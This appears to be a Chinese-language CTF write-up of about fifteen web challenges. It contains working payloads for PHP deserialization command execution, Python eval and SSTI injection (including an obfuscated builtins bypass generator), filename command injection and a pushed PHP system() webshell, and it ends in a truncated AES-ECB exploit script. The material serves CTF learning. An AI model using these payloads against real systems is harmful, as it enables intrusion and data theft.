<h2 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">     if ($_GET[&#x27;num&#x27;] == 114514 &amp;&amp; check($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">              assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</span><br><span class="line">              echo $flag;</span><br><span class="line">     &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">  return !preg_match(&quot;/[a-z]|\;|\(|\)/&quot;,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本地php版本应该有问题，assert不管怎么样都是true</p>
<p>但是这个intval是可以用+-*&#x2F;的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=114514%2b1805296(+编码为%2b)</span><br></pre></td></tr></table></figure>

<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309092235912.png" alt="image-20230909223548862"></p>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Webshell &#123;</span><br><span class="line">    public $cmd = &#x27;echo &quot;Hello World!&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function init() &#123;</span><br><span class="line">        if (!preg_match(&#x27;/flag/i&#x27;, $this-&gt;cmd)) &#123;</span><br><span class="line">            $this-&gt;exec($this-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function exec($cmd) &#123;</span><br><span class="line">        $result = shell_exec($cmd);</span><br><span class="line">        echo $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ez反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:15:&quot;cat f* | base64&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$result=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">for ($i=1;$i&lt;=count($_GET);$i++)&#123;</span><br><span class="line">    if (strlen($_GET[$i])&gt;1)&#123;</span><br><span class="line">        die(&quot;你太长了！！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    $result=$result.$_GET[$i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($result ===&quot;大牛&quot;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>挺有意思的，在php中，一个中文字的len是3，所以要把一个中文拆成三分然后通过 <strong>.</strong> 拼接起来。但是一直不知道要怎么拆分，看了wp才知道是用url编码，所以就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure>

<h2 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;0&#x27;]))&#123;</span><br><span class="line">    $arr[$_GET[&#x27;0&#x27;]]=1;</span><br><span class="line">    if ($arr[]=1)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>啊？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?0</span><br></pre></td></tr></table></figure>

<p>其实是题目有问题，本来应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($arr[]=1)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这样对$arr[]进行一个赋值，如果不进行特殊操作是恒为真的，所以要让这个赋值操作中断</p>
<p>中断原理就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">索引数组最大下标等于最大int数，对其追加会导致整型数溢出，进而引起追加失败</span><br><span class="line">int范围查阅Manual可知：32位最大是231-1，64位是263-1</span><br><span class="line">也就是2147483647与9223372036854775807</span><br><span class="line">https://blog.csdn.net/Xxy605/article/details/120049069</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?0=9223372036854775807</span><br></pre></td></tr></table></figure>



<h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p>学到了，本地修改game.js文件，赢一次+2078分，吃一个就能拿flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100011119.png" alt="image-20230910001159084"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100012462.png" alt="image-20230910001215439"></p>
<h2 id="算力超群"><a href="#算力超群" class="headerlink" title="算力超群"></a>算力超群</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309100033711.png" alt="image-20230910003303691"></p>
<p>随便算个数，进去把5改成7*7有正确回显49，那就是ssti</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?number1=&amp;operator=&amp;number2=__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()</span><br></pre></td></tr></table></figure>

<h2 id="算力升级"><a href="#算力升级" class="headerlink" title="算力升级"></a>算力升级</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/tiesuanzi&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiesuanzi</span>():</span><br><span class="line">    code=request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> pattern.findall(code):<span class="comment">#从code里把单词拿出来</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+$&#x27;</span>,item):<span class="comment">#如果不是数字</span></span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):<span class="comment">#逐个和gmpy2库里的函数名比较</span></span><br><span class="line">               <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;你想干什么？<span class="subst">&#123;item&#125;</span>不是有效的函数&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=<span class="built_in">eval</span>(code)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;计算成功，答案是<span class="subst">&#123;result&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">f&quot;没有执行成功，请检查你的输入。&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>限制是实用的关键字只能是gmpy2中的函数名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(gmpy2)</span><br><span class="line">[<span class="string">&#x27;Default&#x27;</span>, <span class="string">&#x27;DivisionByZeroError&#x27;</span>, <span class="string">&#x27;HAVE_THREADS&#x27;</span>, <span class="string">&#x27;InexactResultError&#x27;</span>, <span class="string">&#x27;InvalidOperationError&#x27;</span>, <span class="string">&#x27;OverflowResultError&#x27;</span>, <span class="string">&#x27;RangeError&#x27;</span>, <span class="string">&#x27;RoundAwayZero&#x27;</span>, <span class="string">&#x27;RoundDown&#x27;</span>, <span class="string">&#x27;RoundToNearest&#x27;</span>, <span class="string">&#x27;RoundToZero&#x27;</span>, <span class="string">&#x27;RoundUp&#x27;</span>, <span class="string">&#x27;UnderflowResultError&#x27;</span>, <span class="string">&#x27;_C_API&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__path__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;_mpmath_create&#x27;</span>, <span class="string">&#x27;_mpmath_normalize&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;agm&#x27;</span>, <span class="string">&#x27;ai&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;bincoef&#x27;</span>, ……]</span><br></pre></td></tr></table></figure>

<p>可见，有一个<code>__builtins__</code>可以使用，而从<code>gmpy2.__builtins__</code>里有eval函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&quot;</span></span><br><span class="line"><span class="comment">##&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]==eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;/&#x27;(). &quot;</span>:</span><br><span class="line">                temp_index=<span class="number">0</span></span><br><span class="line">                temp_string=<span class="string">&#x27;x&#x27;</span>*<span class="number">20</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dir</span>(gmpy2):</span><br><span class="line">                        <span class="keyword">if</span> j.find(i)&gt;=<span class="number">0</span>:</span><br><span class="line">                                <span class="keyword">if</span> <span class="built_in">len</span>(j)&lt;<span class="built_in">len</span>(temp_string):</span><br><span class="line">                                        temp_string=j</span><br><span class="line">                                        temp_index=j.find(i)</span><br><span class="line">                payload+=<span class="string">f&#x27;\&#x27;<span class="subst">&#123;temp_string&#125;</span>\&#x27;[<span class="subst">&#123;temp_index&#125;</span>]+&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                payload+=<span class="string">f&#x27;\&quot;<span class="subst">&#123;i&#125;</span>\&quot;+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=payload[:-<span class="number">1</span>]+<span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&#x27;ai&#x27;[1]+&#x27;agm&#x27;[2]+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;erf&#x27;[1]+&#x27;cot&#x27;[2]+&#x27;c_div&#x27;[1]+&#x27;c_div&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cos&#x27;[1]+&#x27;cos&#x27;[2]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;cmp&#x27;[2]+&#x27;erf&#x27;[0]+&#x27;jn&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cmp&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;cot&#x27;[2]+&quot; &quot;+&quot;/&quot;+&#x27;erf&#x27;[2]+&#x27;lcm&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;agm&#x27;[1]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;erf&#x27;[1]+&#x27;erf&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;add&#x27;[1]+&quot;(&quot;+&quot;)&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="easyPytHon-P"><a href="#easyPytHon-P" class="headerlink" title="easyPytHon_P"></a>easyPytHon_P</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import request</span><br><span class="line">cmd: str = request.form.get(&#x27;cmd&#x27;)</span><br><span class="line">param: str = request.form.get(&#x27;param&#x27;)</span><br><span class="line"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span><br><span class="line">import subprocess, os</span><br><span class="line">if cmd is not None and param is not None:</span><br><span class="line">    try:</span><br><span class="line">        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)</span><br><span class="line">        print(&#x27;Done!&#x27;)</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        print(&#x27;Timeout!&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;Error!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;No Flag!&#x27;)</span><br></pre></td></tr></table></figure>

<p>传入cmd和param，cmd值截取前三个，__file__表示的是当前py文件的绝对路径</p>
<p>subprocess.run([“ls”,”&#x2F;“,”&#x2F;etc”])会同时列出&#x2F;和&#x2F;etc的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309101522095.png" alt="image-20230910152237015"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=cat&amp;param=/app/flag.txt</span><br></pre></td></tr></table></figure>

<h2 id="遍地飘零"><a href="#遍地飘零" class="headerlink" title="遍地飘零"></a>遍地飘零</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class="line">    echo &quot;好多零&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;没有零，仔细看看输入有什么问题吧&quot;;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要想var_dump出$flag，必须要让<code>$_GET=$flag</code> &#x3D;&gt; <code>$key=_GET,$value=flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?_GET=flag</span><br></pre></td></tr></table></figure>

<h2 id="茶歇区"><a href="#茶歇区" class="headerlink" title="茶歇区"></a>茶歇区</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309110030471.png" alt="image-20230910234931585"></p>
<p>有两组，FP&#x3D;1024-count*score，得分&#x3D;count*score</p>
<p>看了一下wp，考的是php整形溢出，就只需要先让count取922337203685477580，让后部分溢出为负数，就可以使得整体的FP&gt;114514，在正常买就能让得分&gt;114514</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#post 发两次就可以了</span><br><span class="line">#不知道为什么但一个e不行，得多加两个参数</span><br><span class="line">a=152000&amp;b=0&amp;c=0&amp;d=0&amp;e=922337203685477580&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81</span><br></pre></td></tr></table></figure>

<h2 id="小舔田？"><a href="#小舔田？" class="headerlink" title="小舔田？"></a>小舔田？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Moon&#123;</span><br><span class="line">    public $name=&quot;月亮&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;牛夫人&quot;;</span><br><span class="line"></span><br><span class="line">    public function call()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        if ($this-&gt;nickname==&quot;小甜甜&quot;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;.$this-&gt;nickname.&quot;。\n&quot;;</span><br><span class="line">            echo &quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $a=new Ion_Fan_Princess();</span><br><span class="line">    echo $a;</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>

<p>印象里做过这个，但具体找不到了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="LSB探姬"><a href="#LSB探姬" class="headerlink" title="LSB探姬"></a>LSB探姬</h2><p>被误导了，以为tsteg.py不但能解密LSB，还能执行其中语句，结果只有解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># File       : app.py</span><br><span class="line"># Time       ：2022/10/20 15:16</span><br><span class="line"># Author     ：g4_simon</span><br><span class="line"># version    ：python 3.9.7</span><br><span class="line"># Description：TSTEG-WEB</span><br><span class="line"># flag is in /app/flag.py</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">#初始化全局变量</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():    </span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            f = request.files[&#x27;file&#x27;]</span><br><span class="line">            f.save(&#x27;upload/&#x27;+f.filename)</span><br><span class="line">            cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;&quot;code&quot;:0,&quot;cmd&quot;:cmd,&quot;result&quot;:result,&quot;message&quot;:&quot;file uploaded!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">        except:</span><br><span class="line">            data=&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;file upload error!&quot;&#125;</span><br><span class="line">            return jsonify(data)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def show_source():</span><br><span class="line">    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br></pre></td></tr></table></figure>

<p><code>result=os.popen(&quot;python3 tsteg.py upload/...;cat flag.py&quot;).read()</code></p>
<p>返回的就是python+cat的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&quot;res_encode.png;cat flag.py&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Is-Not-Obfuscate"><a href="#Is-Not-Obfuscate" class="headerlink" title="Is_Not_Obfuscate"></a>Is_Not_Obfuscate</h2><p>题目奇怪</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309111335252.png" alt="image-20230911133522177"></p>
<p>会执行decode之后的input参数，而且robots.txt里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disallow: /lib.php?flag=0</span><br><span class="line">Disallow: /plugins</span><br></pre></td></tr></table></figure>

<p>传入flag&#x3D;1，得到</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309111337834.png" alt="image-20230911133708811"></p>
<p>上面一串O0估计表示加密什么东西，下面的估计就是密文</p>
<p>结合上面的decode，把这一串传入到input中，把action改为test执行，还得url编码一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ！！！</span></span><br><span class="line"><span class="comment">//测试执行加密后的插件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>可以看出要先传入output，把文件写到.&#x2F;plugins目录下，文件名是md5后的结果</p>
<p>然后eval执行.&#x2F;plugins&#x2F;文件名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?input=&amp;action=push&amp;output=&lt;?php system(&#x27;cat /f*&#x27;);?&gt;</span><br><span class="line">?input=2e487432444053a0e4c42d08e42016a8&amp;action=pull&amp;output=</span><br></pre></td></tr></table></figure>

<h2 id="龙珠NFT"><a href="#龙珠NFT" class="headerlink" title="龙珠NFT"></a>龙珠NFT</h2><p>完全没思路，玩不明白crypto，直接看wp</p>
<p>根据源码可知，address是用AES的ECB模式加密的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309112009132.png" alt="image-20230911200947045"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AESCipher():</span><br><span class="line">    def __init__(self,key):</span><br><span class="line">        self.key = self.add_16(hashlib.md5(key.encode()).hexdigest()[:16])</span><br><span class="line">        self.model = AES.MODE_ECB</span><br><span class="line">        self.aes = AES.new(self.key,self.model)</span><br></pre></td></tr></table></figure>

<p>而明文分组长度是16位，当一组明文相等时，加密后的密文也应该相等</p>
<p>而返回的数值按16位分组后的结果就是</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309112027617.png" alt="image-20230911202754589"></p>
<p>显然round_no是一直递增的，思路就是删掉其中64-80这一行，这就让dragonball随着次数的增加而增加</p>
<p>wp给的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">url=<span class="string">&#x27;http://xxxxxxxxxxxxxxxxxxxxxx/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">username=<span class="built_in">str</span>(random.randint(<span class="number">1</span>,<span class="number">100000</span>))</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line">r=s.get(url+<span class="string">&#x27;?username=&#x27;</span>+username)</span><br><span class="line">responses=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r=s.get(url+<span class="string">&#x27;find_dragonball&#x27;</span>)</span><br><span class="line">        responses.append(json.loads(r.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> responses:</span><br><span class="line">	data=json.dumps(&#123;<span class="string">&#x27;player_id&#x27;</span>:item[<span class="string">&#x27;player_id&#x27;</span>],<span class="string">&#x27;dragonball&#x27;</span>:item[<span class="string">&#x27;dragonball&#x27;</span>],<span class="string">&#x27;round_no&#x27;</span>:item[<span class="string">&#x27;round_no&#x27;</span>],<span class="string">&#x27;time&#x27;</span>:item[<span class="string">&#x27;time&#x27;</span>]&#125;)</span><br><span class="line">        miwen=base64.b64decode(item[<span class="string">&#x27;address&#x27;</span>])</span><br><span class="line">        round_no=item[<span class="string">&#x27;round_no&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> round_no <span class="keyword">in</span> [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span 